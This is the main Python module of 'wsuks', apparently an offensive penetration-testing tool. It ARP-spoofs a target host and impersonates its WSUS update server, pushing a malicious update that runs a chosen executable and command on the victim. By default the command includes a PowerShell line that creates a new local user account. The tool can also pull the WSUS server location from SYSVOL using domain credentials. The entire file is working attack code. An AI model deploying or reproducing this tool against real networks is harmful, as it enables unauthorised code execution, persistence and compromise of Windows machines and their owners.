#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from functools import partial
from http.server import HTTPServer
import logging
import os
from pprint import pformat
import random
from string import digits, ascii_letters
from scapy.all import get_if_addr, sniff, conf, IP, TCP, send
from wsuks.helpers.arpspoofer import ArpSpoofer
from wsuks.helpers.logger import initLogger
from wsuks.helpers.argparser import initParser, printBanner
from wsuks.helpers.sysvolparser import SysvolParser
from wsuks.helpers.wsusserver import WSUSUpdateHandler, WSUSBaseServer
from wsuks.helpers.router import Router
from termcolor import colored


class Wsuks:
    def __init__(self, args):
        self.args = args

        self.logger = logging.getLogger("wsuks")
        self.interface = args.interface
        self.hostIp = get_if_addr(self.interface)
        self.local_username = "user" + "".join(random.choice(digits) for i in range(5))
        self.local_password = "".join(random.sample(ascii_letters, 16))

        # Set args
        self.targetIp = args.targetIp  # Never None (required)
        self.executable_file = args.executable.read()
        self.executable_name = os.path.basename(args.executable.name)
        args.executable.close()

        # Set Command
        if "PREFIX" not in args.command:
            self.command = args.command
        else:
            command_prefix = "New-LocalUser -Name WSUKS_USER -Password $(ConvertTo-SecureString WSUKS_PASSWORD -AsPlainText -Force) -Fullname wsuks-user -Description This_user_was_generated_by_the_wsuks_Tool;"
            if args.username and args.password and args.domain:
                self.logger.success(f"Using domain user for the WSUS attack: User={colored(args.username, 'green', attrs=['bold'])} Password={colored(args.password, 'green', attrs=['bold'])} Domain={colored(args.domain, 'green', attrs=['bold'])}")
                self.command = args.command.replace("PREFIX", "").replace("WSUKS_USER", args.domain + "\\" + args.username).replace("WSUKS_PASSWORD", args.password)
            else:
                self.logger.success(f"Generated local user for the WSUS attack: Username={colored(self.local_username, 'green', attrs=['bold'])} Password={colored(self.local_password, 'green', attrs=['bold'])}")
                self.command = args.command.replace("PREFIX", command_prefix).replace("WSUKS_USER", self.local_username).replace("WSUKS_PASSWORD", self.local_password)
        self.logger.success(f"Command to execute: {self.command}")

        self.wsusIp = args.wsusIp
        self.wsusPort = args.wsusPort  # Default 8530
        self.domain_username = args.username
        self.domain_password = args.password
        self.domain = args.domain
        self.dcIp = args.dcIp

    def run(self):
        # Get the WSUS server IP and Port from the sysvol share
        sysvolparser = SysvolParser()
        if not self.wsusIp:
            self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.domain_username, self.domain_password, self.dcIp)
        else:
            self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")

        # Start Arp Spoofing
        arpspoofer = ArpSpoofer(self.interface)
        arpspoofer.start(self.targetIp, self.wsusIp)

        # self.logger.debug(conf.route)
        # conf.route.add(host=self.wsusIp, gw=self.hostIp)
        # self.logger.debug(conf.route)

        # Prepare WSUS Update Handler
        # router = Router()
        # router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)

        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
        update_handler.set_resources_xml(self.command)

        self.logger.debug(update_handler)

        # Prepare WSUS HTTP Server
        http_handler = partial(WSUSBaseServer, update_handler)
        http_server = HTTPServer((self.hostIp, self.wsusPort), http_handler)
        try:
            self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
            http_server.serve_forever()
        except KeyboardInterrupt:
            print("")
            self.logger.info("Stopping WSUS Server...")
        finally:
            conf.route.resync()
            # self.logger.debug(conf.route)
            # router.stop()
            arpspoofer.stop()

    def handlePacket(self, packet):
        #and (packet[IP].src == self.targetIp or packet[IP].src == self.hostIp or packet[IP].src == self.wsusIp)
        if IP in packet and TCP in packet and packet[IP].src == self.targetIp:
            packet.show()


def main():
    # Setup
    printBanner()
    args = initParser()

    logger = initLogger(debug=args.debug)
    logger.debug('Passed args:\n' + pformat(vars(args)))

    # Prevent scapy from logging to console
    scapyLogger = logging.getLogger('scapy')
    scapyLogger.handlers.clear()

    if os.geteuid() != 0:
        logger.error("This script must be run as root!")
        exit(1)

    wsuks = Wsuks(args)
    wsuks.run()


if __name__ == '__main__':
    main()
